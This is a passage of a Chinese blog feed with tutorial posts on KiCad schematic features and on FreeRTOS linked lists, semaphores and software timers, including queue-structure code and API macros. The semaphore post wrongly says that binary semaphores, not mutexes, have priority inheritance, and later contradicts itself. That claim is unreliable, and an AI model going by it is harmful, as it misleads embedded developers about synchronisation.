中的标签种类</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202405062215111.png"></p><h3 id="层次引脚"><a href="#层次引脚" class="headerlink" title="层次引脚"></a>层次引脚</h3><p>在 <code>KiCad</code> 中，一副原理图可以有多个子原理图，同时子原理图也可以拥有子原理图，<strong>实际上，所谓的子原理图就是画一个框，双击这个框就可以进入子原理图，在子原理图中绘制好之后，将需要引出的引脚上标注好 <code>层次引脚</code> 然后回到原来的哪个框，再次使用 <code>层次引脚</code> 就可以将子原理图中标注了同样标签的引脚引出</strong></p><h2 id="PWR-FLAG符号"><a href="#PWR-FLAG符号" class="headerlink" title="PWR_FLAG符号"></a>PWR_FLAG符号</h2><p><code>PWR_FLAG</code> 这个符号是 <code>KiCad</code> 所独有，用来标注电路板电力来源的虚拟符号。</p><p><strong>所以不是电路板的电源来源就不需要进行标注</strong></p><h2 id="网络类"><a href="#网络类" class="headerlink" title="网络类"></a>网络类</h2><p>不管是在原理图中还是 <code>PCB</code> 文件中都可以设置网络类，并且<strong>这两者是相同的</strong>。当由这些原理图源文件导入到PCB之后，这些网络类指示器所对应的信息将用于在PCB中创建相应的网络类。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="http://www.uinio.com/Electronics/KiCad_Tutorial/#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8E%9F%E7%90%86%E5%9B%BE%E7%AC%A6%E5%8F%B7https://www.uinio.com/Electronics/KiCad_Tutorial/">KiCad 6.0 电路设计小书</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-7-链表</title>
    <link href="/2024/01/20/FreeRTOS-7-%E9%93%BE%E8%A1%A8/"/>
    <url>/2024/01/20/FreeRTOS-7-%E9%93%BE%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>FreeRTOS中链表不是一般的链表，而具有一下三种特点：</p><ul><li>循环</li><li>从小到大</li><li>双向</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-5-信号量</title>
    <link href="/2024/01/18/FreeRTOS-5-%E4%BF%A1%E5%8F%B7%E9%87%8F/"/>
    <url>/2024/01/18/FreeRTOS-5-%E4%BF%A1%E5%8F%B7%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在FreeRTOS中，信号量是使用队列来实现的。我们后面会看到所有的信号量的相关函数都是对于队列函数的封装。</p><h1 id="信号量的分类"><a href="#信号量的分类" class="headerlink" title="信号量的分类"></a>信号量的分类</h1><p>在FreeRTOS中有四种信号量：</p><ul><li>二值信号量</li><li>互斥信号量</li><li>递归信号量</li><li>计数信号量</li></ul><p>每一种信号量都有其使用的范围。</p><h2 id="二值信号量"><a href="#二值信号量" class="headerlink" title="二值信号量"></a>二值信号量</h2><p>其实就是Linux中的二元信号量，在FreeRTOS中又称之为二进制信号量。在概念上，可以将二进制信号量理解为一个长度为一的队列。该队列可以在任何时候都最多包含一个项，所以总是要么是空的，要么是满的（hence, binary）。</p><p><strong>二值信号量和互斥信号量十分相似，但是二值信号量具有优先级的继承功能，而互斥信号量没有。</strong>所以二值信号量常常用于任务于任务或者是任务与中断之间的同步；而互斥信号量则用作对临界区访问的保护。</p><h2 id="计数信号量"><a href="#计数信号量" class="headerlink" title="计数信号量"></a>计数信号量</h2><p>二进制信号量可以看作长度为1的队列，而计数信号量则可以看作长度大于1的队列，信号量使用者依然不必关心存储在队列中的消息，只需要关心队列中是否有消息即可。</p><p>在实际使用中，我们常将计数信号量用于<strong>事件计数与资源管理</strong>。每当某个事件发生时，任务或者中断将释放一个信号量（信号量计数值加1），当事件被处理时（一般在任务中处理），处理任务会取走该信号量（信号量计数值减1）。信号量的计数值表示还有多少个事件未被处理。此外，系统中还有很多资源，我们也可以使用计数信号量进行资源管理。信号量的计数值表示系统中可用的资源数目，任务必须先获取到信号量才能获取资源访问权，当信号量的计数值为0时，表示系统没有可用的资源，但是要注意，在使用完资源时必须归还信号量，否则当计数值为0时，任务就无法访问该资源了。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401190043654.png"></p><h2 id="递归信号量"><a href="#递归信号量" class="headerlink" title="递归信号量"></a>递归信号量</h2><p>这个信号量的不同在于，其他信号量都是只能够读或者不读二选一。但是递归信号量可以多次读取。</p><p>按照信号量的特性，每获取一次，可用信号量个数就会减少一个，但是递归则不然，已经获取递归互斥量的任务可以重复获取该递归互斥量，该任务拥有递归信号量的所有权。<strong>任务成功获取几次递归互斥量，就要返还几次</strong>，在此之前，递归互斥量都处于无效状态，其他任务无法获取，只有持有递归信号量的任务才能获取与释放。</p><h2 id="互斥信号量"><a href="#互斥信号量" class="headerlink" title="互斥信号量"></a>互斥信号量</h2><p><strong>互斥信号量无法在中断中使用</strong>。其他几个都可以。</p><p>互斥信号量其实是特殊的二值信号量，其特有的优先级继承机制使它更适用于简单互锁，也就是保护临界资源（关于优先级继承将在后文中详细讲解）。用作互斥时，信号量创建后可用信号量个数应该是满的，任务在需要使用临界资源（临界资源是指任何时刻只能被一个任务访问的资源）时，先获取互斥信号量，使其为空，这样其他任务需要使用临界资源时就会因为无法获取信号量而进入阻塞，从而保证了临界资源的安全。</p><h1 id="信号控制块"><a href="#信号控制块" class="headerlink" title="信号控制块"></a>信号控制块</h1><p>信号量的API函数实际上都是宏，使用现有的队列机制，这些宏在semphr.h文件中定义，如果使用信号量或者互斥量，则需要包含semphr.h头文件，所以<strong>FreeRTOS的信号量控制块结构体与消息队列结构体是一样的，只不过结构体中某些成员变量代表的含义不同。</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"> <span class="hljs-number">1</span> typedefstruct QueueDefinition &#123;<br> <span class="hljs-number">2</span>     <span class="hljs-type">int8_t</span> *pcHead;<br> <span class="hljs-number">3</span>     <span class="hljs-type">int8_t</span> *pcTail;<br> <span class="hljs-number">4</span>     <span class="hljs-type">int8_t</span> *pcWriteTo;<br> <span class="hljs-number">5</span><br> <span class="hljs-number">6</span>     <span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br> <span class="hljs-number">7</span>         <span class="hljs-type">int8_t</span> *pcReadFrom;<br> <span class="hljs-number">8</span>         UBaseType_t uxRecursiveCallCount;<br> <span class="hljs-number">9</span>     &#125; u;<br><span class="hljs-number">10</span><br><span class="hljs-number">11</span>     List_t xTasksWaitingToSend;<br><span class="hljs-number">12</span>     List_t xTasksWaitingToReceive;<br><span class="hljs-number">13</span><br><span class="hljs-number">14</span>     <span class="hljs-keyword">volatile</span> UBaseType_t uxMessagesWaiting;(<span class="hljs-number">1</span>)<br><span class="hljs-number">15</span>     UBaseType_t uxLength;(<span class="hljs-number">2</span>)<br><span class="hljs-number">16</span>     UBaseType_t uxItemSize;(<span class="hljs-number">3</span>)<br><span class="hljs-number">17</span><br><span class="hljs-number">18</span>     <span class="hljs-keyword">volatile</span> <span class="hljs-type">int8_t</span> cRxLock;<br><span class="hljs-number">19</span>     <span class="hljs-keyword">volatile</span> <span class="hljs-type">int8_t</span> cTxLock;<br><span class="hljs-number">20</span><br><span class="hljs-number">21</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span>( ( configSUPPORT_STATIC_ALLOCATION == 1 )</span><br><span class="hljs-number">22</span>     &amp;&amp; ( configSUPPORT_DYNAMIC_ALLOCATION == <span class="hljs-number">1</span> ) )<br><span class="hljs-number">23</span>     <span class="hljs-type">uint8_t</span> ucStaticallyAllocated;<br><span class="hljs-number">24</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">25</span><br><span class="hljs-number">26</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_QUEUE_SETS == 1 )</span><br><span class="hljs-number">27</span>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">QueueDefinition</span> *<span class="hljs-title">pxQueueSetContainer</span>;</span><br><span class="hljs-number">28</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">29</span><br><span class="hljs-number">30</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TRACE_FACILITY == 1 )</span><br><span class="hljs-number">31</span>             UBaseType_t uxQueueNumber;<br><span class="hljs-number">32</span>             <span class="hljs-type">uint8_t</span> ucQueueType;<br><span class="hljs-number">33</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-number">34</span><br><span class="hljs-number">35</span>         &#125; xQUEUE;<br><span class="hljs-number">36</span><br><span class="hljs-number">37</span> <span class="hljs-keyword">typedef</span> xQUEUE Queue_t;<br></code></pre></td></tr></table></figure><p>（1）：如果控制块结构体是用于<strong>消息队列</strong>，则<code>uxMessagesWaiting</code>用来记录当前消息队列的消息个数；</p><p>如果控制块结构体被用于<strong>信号量</strong>时，则这个值表示有效信号量个数，有以下两种情况：   </p><ul><li>如果信号量是二值信号量、互斥信号量，这个值为1则表示有可用信号量，为0则表示没有可用信号量。</li><li>如果是计数信号量，这个值表示可用的信号量个数，在创建计数信号量时会被初始化一个可用信号量个数<code>uxInitialCount</code>，最大不允许超过创建信号量的初始值<code>uxMaxCount</code>。</li></ul><p>（2）：如果控制块结构体是用于消息队列，则uxLength表示队列的长度，也就是能存放多少消息；</p><p>如果控制块结构体被用于信号量时，则uxLength表示最大的信号量可用个数，会有以下两种情况：   </p><ul><li>如果信号量是二值信号量、互斥信号量，uxLength最大为1，因为信号量要么是有效的，要么是无效的。</li><li>如果是计数信号量，这个值表示最大的信号量个数，在创建计数信号量时将由用户指定uxMaxCount。</li></ul><p>（3）：如果控制块结构体是用于消息队列，则uxItemSize表示单个消息的大小；</p><p>如果控制块结构体被用于信号量时，则无须分配存储空间，为0即可。</p><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><p>创建、删除、发送数据（任务和中断两种）、接受数据（任务和中断两种）</p><p>其中创建又有</p><ul><li>创建一个二元信号量</li><li>创建一个计数信号量</li><li>创建一个递归信号量</li><li>创建一个</li></ul><h2 id="创建一个二元信号量"><a href="#创建一个二元信号量" class="headerlink" title="创建一个二元信号量"></a>创建一个二元信号量</h2><p>函数<code>xSemaphoreCreateBinary()</code>可以完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreCreateBinary()    xQueueGenericCreate( ( UBaseType_t ) 1, semSEMAPHORE_QUEUE_ITEM_LENGTH, queueQUEUE_TYPE_BINARY_SEMAPHORE )</span><br><br></code></pre></td></tr></table></figure><p>这个函数实际上是对于<code>xQueueGenericCreate()</code>函数封装，我们后面的创建信号量的函数都差不多。</p><p>下面是创建的二元信号量<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401230106515.png"></p><h2 id="创建一个计数信号量"><a href="#创建一个计数信号量" class="headerlink" title="创建一个计数信号量"></a>创建一个计数信号量</h2><p>创建计数信号量<code>xSemaphoreCreateCounting()</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreCreateCounting( uxMaxCount, uxInitialCount )    xQueueCreateCountingSemaphore( ( uxMaxCount ), ( uxInitialCount ) )</span><br><br></code></pre></td></tr></table></figure><p>这个函数也是对与其他队列函数的封装。在<code>xQueueCreateCountingSemaphore()</code>这个函数中也使用到了函数<code>xQueueGenericCreate()</code>。</p><p>下面是创建的计数信号量<br><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401230106317.png"></p><h2 id="其他两个信号量"><a href="#其他两个信号量" class="headerlink" title="其他两个信号量"></a>其他两个信号量</h2><p>互斥信号量（互斥量）和递归信号量会在下一篇文章中进行总结。</p><h1 id="删除函数"><a href="#删除函数" class="headerlink" title="删除函数"></a>删除函数</h1><p><code>vSemaphoreDelete()</code>用于删除一个信号量，<strong>包括二值信号量、计数信号量、互斥量和递归互斥量。如果有任务阻塞在该信号量上，那么不要删除该信号量。</strong></p><p>创建信号量需要多个不同的函数，但是删除信号量都是同一个函数。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401230142097.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> vSemaphoreDelete( xSemaphore )    vQueueDelete( ( QueueHandle_t ) ( xSemaphore ) )</span><br></code></pre></td></tr></table></figure><p>对于队列删除函数的封装。</p><h1 id="信号量的释放"><a href="#信号量的释放" class="headerlink" title="信号量的释放"></a>信号量的释放</h1><p>这个信号量的释放实际上就是<strong>队列入队</strong>。所以这个函数应该要先于获取函数。</p><p>与消息队列的操作一样，信号量的释放可以在任务、中断中使用，所以需要有不一样的API函数在不一样的上下文环境中调用。</p><p>FreeRTOS提供了信号量释放函数，每调用一次该函数就释放一个信号量。但是有一个问题，能不能一直释放？很显然是不能的，无论是二值信号量还是计数信号量，都要注意可用信号量的范围，当用作二值信号量时，必须确保其可用值在0～1范围内；而如果用作计数信号量，其范围是由用户在创建时指定uxMaxCount，其最大可用信号量不允许超出uxMaxCount，这说明我们不能一直调用信号量释放函数来释放信号量，其实一直调用也是无法释放成功的，在写代码时要注意代码的严谨性。</p><h2 id="在任务中使用的释放函数"><a href="#在任务中使用的释放函数" class="headerlink" title="在任务中使用的释放函数"></a>在任务中使用的释放函数</h2><p><code>xSemaphoreGive()</code>是一个用于释放信号量的宏，真正的实现过程是调用消息队列通用发送函数。<strong>就是入队</strong>。</p><p>通过消息队列入队过程分析，我们可以将释放一个信号量的过程简化：如果信号量未满，控制块结构体成员uxMessageWaiting就会加1，然后判断是否有阻塞的任务，如果有就会恢复阻塞的任务，然后返回成功信息（pdPASS）；如果信号量已满，则返回错误代码（err_QUEUE_FULL）</p><p>这个函数是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreGive( xSemaphore )    xQueueGenericSend( ( QueueHandle_t ) ( xSemaphore ), NULL, semGIVE_BLOCK_TIME, queueSEND_TO_BACK )</span><br></code></pre></td></tr></table></figure><p>对于队列发送函数的封装。</p><h3 id="适用范围："><a href="#适用范围：" class="headerlink" title="适用范围："></a>适用范围：</h3><p>释放的信号量对象必须是已经被创建的，可以用于二值信号量、计数信号量、互斥量的释放，<strong>但不能释放由函数<code>xSemaphoreCreateRecursiveMutex()</code>创建的递归互斥量</strong>。此外，该函数不能在中断中使用。</p><h2 id="在中断中使用释放函数"><a href="#在中断中使用释放函数" class="headerlink" title="在中断中使用释放函数"></a>在中断中使用释放函数</h2><p>适用于中断处理函数中。这个函数也是对于队列相关函数的包装：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreGiveFromISR( xSemaphore, pxHigherPriorityTaskWoken )    xQueueGiveFromISR( ( QueueHandle_t ) ( xSemaphore ), ( pxHigherPriorityTaskWoken ) )</span><br></code></pre></td></tr></table></figure><h3 id="使用范围"><a href="#使用范围" class="headerlink" title="使用范围"></a>使用范围</h3><p><code>xSemaphoreGiveFromISR()</code>用于释放一个信号量，带中断保护。被释放的信号量可以是<strong>二元信号量和计数信号量</strong>。和普通版本的释放信号量API函数有些许不同，<code>xSemaphoreGiveFromISR()</code>不能释放互斥量，这是因为互斥量不可以在中断中使用。互斥量的优先级继承机制只能在任务中起作用，而在中断中毫无意义。</p><h1 id="信号量的获取函数"><a href="#信号量的获取函数" class="headerlink" title="信号量的获取函数"></a>信号量的获取函数</h1><p>同样的也是分为适用于任务中的和中断中的。其实就是出队列。</p><h2 id="在任务中使用获取函数"><a href="#在任务中使用获取函数" class="headerlink" title="在任务中使用获取函数"></a>在任务中使用获取函数</h2><p>这个函数的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> xSemaphoreTake( xSemaphore, xBlockTime )    xQueueSemaphoreTake( ( xSemaphore ), ( xBlockTime ) )</span><br></code></pre></td></tr></table></figure><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401230141347.png"></p><p>如果有可用信号量，控制块结构体成员uxMessageWaiting就会减1，然后返回获取成功信息（pdPASS）；如果信号量无效并且阻塞时间为0，则返回错误代码（errQUEUE_EMPTY）；如果信号量无效并且用户指定了阻塞时间，则任务会因为等待信号量而进入阻塞状态，并被挂接到延时列表中。</p><h3 id="适用范围"><a href="#适用范围" class="headerlink" title="适用范围"></a>适用范围</h3><p><code>xSemaphoreTake()</code>函数用于获取信号量，不带中断保护。获取的信号量对象可以是二值信号量、计数信号量和互斥量，但是递归互斥量并不能使用这个API函数获取。</p><h2 id="在中断中使用获取函数"><a href="#在中断中使用获取函数" class="headerlink" title="在中断中使用获取函数"></a>在中断中使用获取函数</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401230144902.png"></p><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><p>xSemaphoreTakeFromISR()是函数xSemaphoreTake()的中断版本，用于获取信号量，是一个不带阻塞机制获取信号量的函数，获取对象必须是已经创建的信号量，信号量类型可以是二值信号量和计数信号量。xSemaphoreTakeFromISR()与xSemaphoreTake()函数不同，它不能用于获取互斥量，因为互斥量不可以在中断中使用，并且互斥量特有的优先级继承机制只能在任务中起作用，而在中断中毫无意义。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-4-软件定时器管理</title>
    <link href="/2024/01/16/FreeRTOS-4-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E6%97%B6%E5%99%A8%E7%AE%A1%E7%90%86/"/>
    <url>/2024/01/16/FreeRTOS-4-%E8%BD%AF%E4%BB%B6%E5%AE%9A%E6%97%B6%E5%99%A8%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>软件计时器用于调度功能在将来的设定时间执行，或以固定频率定期执行。由软件定时器执行的函数称为<strong>软件定时器的回调函数</strong>。</p><p>软件计时器由FreeRTOS内核实现，并受FreeRTOS内核的控制。它们不需要硬件支持，也与硬件计时器或硬件计数器无关。</p><p>软件计时器功能是可选的。要包括软件计时器功能，请执行以下操作:</p><ul><li>将FreeRTOS源文件FreeRTOS&#x2F;Source&#x2F;timers.c构建为项目的一部分 </li><li>在FreeRTOSConfig.h中将configUSE_TIMERS设置为1。</li></ul><h1 id="定时器回调函数"><a href="#定时器回调函数" class="headerlink" title="定时器回调函数"></a>定时器回调函数</h1><p>函数原型:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">ATimerCallback</span><span class="hljs-params">( TimerHandle_t xTimer )</span>;<br></code></pre></td></tr></table></figure><p>其参数为:<br>软件定时器的唯一句柄</p><h1 id="软件定时器的属性和状态"><a href="#软件定时器的属性和状态" class="headerlink" title="软件定时器的属性和状态"></a>软件定时器的属性和状态</h1><p>软件定时器分为</p><ul><li>一次性定时器: 一旦启动则只执行一次，并且不会自动重新执行，可以手动重新执行</li><li>自动重新加载计时器： 一旦启动，自动重新加载计时器将在每次到期时重新启动，从而定期执行其回调函数。</li></ul><h2 id="软件定时器的状态"><a href="#软件定时器的状态" class="headerlink" title="软件定时器的状态"></a>软件定时器的状态</h2><p>有两种状态：</p><ul><li>休眠状态</li><li>运行状态</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202401162213177.png"><br>上面这张图显示了软件定时器的状态之间的转换</p><h2 id="软件定时器的上下文"><a href="#软件定时器的上下文" class="headerlink" title="软件定时器的上下文"></a>软件定时器的上下文</h2><h3 id="RTOS的守护任务"><a href="#RTOS的守护任务" class="headerlink" title="RTOS的守护任务"></a>RTOS的守护任务</h3><p>所有软件计时器回调函数都在同一RTOS守护进程(或“计时器服务”)任务的上下文中执行</p><p>该任务过去被称为“计时器服务任务”，因为最初它只用于执行软件计时器回调函数。现在同一任务也用于其他目的，因此它被称为“RTOS守护程序任务”的更一般的名称。</p><p>守护程序任务，是在启动调度程序时，自动创建的标准FreeRTOS任务。其优先级和堆栈大小分别由<code>configTIMER_TASK_PRIORITY</code>和<code>configTIMER_TASK_STACK_DEPTH</code>编译时间配置常量设置。这两个常量都在<code>FreeRTOSConfig.h</code>中定义。</p><p>软件计时器回调函数不得调用会导致调用任务进入阻塞状态的FreeRTOS API函数，否则将导致守护程序任务进入阻塞状态。</p><h3 id="计时器命令队列"><a href="#计时器命令队列" class="headerlink" title="计时器命令队列"></a>计时器命令队列</h3><p>计时器命令队列是在<strong>启动调度程序</strong>时自动创建的标准FreeRTOS队列。定时器命令队列的长度由FreeRTOSConfig.h中的configTIMER_QUEUE_LENGTH编译时间配置常量设置。</p><p><strong>软件计时器API函数将命令从调用任务发送到称为“计时器命令队列”的队列上的守护程序任务。</strong></p><p><strong>守护程序任务与任何其他FreeRTOS任务一样进行调度</strong>；当守护程序任务是能够运行的最高优先级任务时，它只会处理命令或执行计时器回调函数。</p><h1 id="创建软件定时器"><a href="#创建软件定时器" class="headerlink" title="创建软件定时器"></a>创建软件定时器</h1><p>函数<code>xTimerCreate()</code>可以创建一个软件定时器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">TimerHandle_t <span class="hljs-title function_">xTimerCreate</span><span class="hljs-params">( <span class="hljs-type">const</span> <span class="hljs-type">char</span> * <span class="hljs-type">const</span> pcTimerName, </span><br><span class="hljs-params">                                TickType_t xTimerPeriodInTicks, </span><br><span class="hljs-params">                                UBaseType_t uxAutoReload, </span><br><span class="hljs-params">                                <span class="hljs-type">void</span> * pvTimerID, </span><br><span class="hljs-params">                                TimerCallbackFunction_t pxCallbackFunction )</span>;<br></code></pre></td></tr></table></figure><p>参数说明：</p><table><thead><tr><th>参数&#x2F;返回值</th><th>描述</th></tr></thead><tbody><tr><td>pcTimerName</td><td>定时器的名字，但是程序永远不会使用它，这仅仅是用来调试的</td></tr><tr><td>xTimerPeriodInTicks</td><td>以刻度为单位指定的计时器周期。pdMS_TO_TICKS()宏可用于将以毫秒为单位指定的时间转换为以计时单位指定的时间。</td></tr><tr><td>uxAutoReload</td><td>将<code>uxAutoReload</code>设置为<code>pdTRUE</code>以创建自动重新加载计时器。将<code>uxAutoReload</code>设置为<code>pdFALSE</code>以创建一次性计时器</td></tr><tr><td>pvTimerID</td><td>初始化ID。每个软件定时器都有一个ID值。ID是一个空指针，应用程序编写器可以将其用于任何目的。当多个软件计时器使用相同的回调函数时，ID特别有用，因为它可用于提供特定于计时器的存储。</td></tr><tr><td>本章中的一个示例演示了计时器ID的使用。 pvTimerID设置正在创建的任务的ID的初始值。</td><td></td></tr><tr><td>pxCallbackFunction</td><td>软件计时器回调函数仅仅是符合清单72中所示原型的C函数。pxCallbackFunction参数是指向要用作正在创建的软件计时器的回调函数的函数指针(实际上就是函数名)。</td></tr><tr><td>返回值</td><td>如果返回NULL，则无法创建软件计时器，因为FreeRTOS没有足够的堆内存来分配必要的数据结构。返回的非NULL值表示软件计时器已成功创建。返回值是创建的计时器的句柄。 第2章提供了有关堆内存管理的更多信息。</td></tr></tbody></table><h2 id="软件定时器开启-关闭函数"><a href="#软件定时器开启-关闭函数" class="headerlink" title="软件定时器开启&#x2F;关闭函数"></a>软件定时器开启&#x2F;关闭函数</h2><p><code>xTimerStart()</code>用于启动处于休眠状态的软件定时器，或重置(重新启动)处于运行状态的软件定时器。<code>xTimerStop()</code>用于停止处于运行状态的软件计时器。停止软件计时器与将计时器转换到休眠状态相同。</p><p>可以在调度程序启动之前调用<code>xTimerStart()</code>，但是当这样做时，软件计时器直到调度程序启动时才会实际启动。</p><p>xTimerStart()函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BaseType_t <span class="hljs-title function_">xTimerStart</span><span class="hljs-params">( TimerHandle_t xTimer, TickType_t xTicksToWait )</span>;<br></code></pre></td></tr></table></figure><p>参数说明:</p><table><thead><tr><th>参数&#x2F;返回值</th><th>描述</th></tr></thead><tbody><tr><td>xTimer</td><td>正在启动或重置的软件计时器的句柄。句柄将从用于创建软件计时器的xTimerCreate()调用中返回。</td></tr><tr><td>xTicksToWait</td><td>xTimerStart()使用计时器命令队列向守护程序任务发送“启动计时器”命令。<br><br>xTicksToWait指定如果队列已满，调用任务应保持在阻塞状态以等待计时器命令队列上的空间变为可用的最长时间。<br><br>如果xTicksToWait为零且计时器命令队列已满，则xTimerStart()将立即返回。<br><br>阻塞时间以滴答周期指定，因此它表示的绝对时间取决于滴答频率。宏pdMS_TO_TICKS()可用于将以毫秒为单位的时间转换为以滴答为单位的时间。<br><br>如果FreeRTOSConfig.h中的include_vTaskSuspend设置为1，则将xTicksToWait设置为portMAX_DELAY将导致调用任务无限期地保持在阻塞状态(没有超时)，以等待定时器命令队列中的空间变得可用。<br><br>如果在调度程序启动之前调用xTimerStart()，则会忽略xTicksToWait的值，并且xTimerStart()的行为就像xTicksToWait已设置为零一样。</td></tr><tr><td>返回值</td><td>有两个可能的返回值<br>1. pdPASS<br><br>只有当“启动定时器”命令成功发送到定时器命令队列时，才会返回pdPASS。<br><br>如果守护程序任务的优先级高于调用xTimerStart()的任务的优先级，那么调度程序将确保在xTimerStart()返回之前处理启动命令。这是因为一旦计时器命令队列中有数据，守护进程任务就会抢占调用xTimerStart()的任务。<br><br>如果指定了阻塞时间(xTicksToWait不是零)，则在函数返回之前，调用任务可能被置于阻塞状态，以等待计时器命令队列中的空间变为可用，但在块时间到期之前，数据已成功写入计时器命令队列。<br><br>2.pdFALSE<br><br>如果由于队列已满而无法将“启动定时器”命令写入定时器命令队列，则将返回pdFALSE。<br><br>如果指定了阻塞时间(xTicksToWait不是零)，则调用任务将被置于阻塞状态，以等待守护进程任务在计时器命令队列中腾出空间，但指定的阻塞时间在此之前已过期。</td></tr></tbody></table><h2 id="软件定时器ID"><a href="#软件定时器ID" class="headerlink" title="软件定时器ID"></a>软件定时器ID</h2><p>软件定时器ID是一个<code>void*</code>类型的值，所以可以将其转换为各种类型的数据。</p><p>创建软件计时器时会为ID分配初始值-之后可以使用<code>vTimerSetTimerID()</code>API函数更新ID，并使用<code>pvTimerGetTimerID()</code>API函数进行查询。</p><h2 id="更改定时器的周期"><a href="#更改定时器的周期" class="headerlink" title="更改定时器的周期"></a>更改定时器的周期</h2><p>软件定时器的作用实际上是计时，在设置的时间到达后执行指定的函数。</p><p>使用<code>xTimerChangePeriod()</code>函数更改软件计时器的周期。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">BaseType_t <span class="hljs-title function_">xTimerChangePeriod</span><span class="hljs-params">( TimerHandle_t xTimer,  </span><br><span class="hljs-params">                               TickType_t xNewTimerPeriodInTicks, </span><br><span class="hljs-params">                               TickType_t xTicksToWait )</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>FreeRTOS-3-消息队列</title>
    <link href="/2024/01/15/FreeRTOS-3-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    <url>/2024/01/15/FreeRTOS-3-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</url>
    
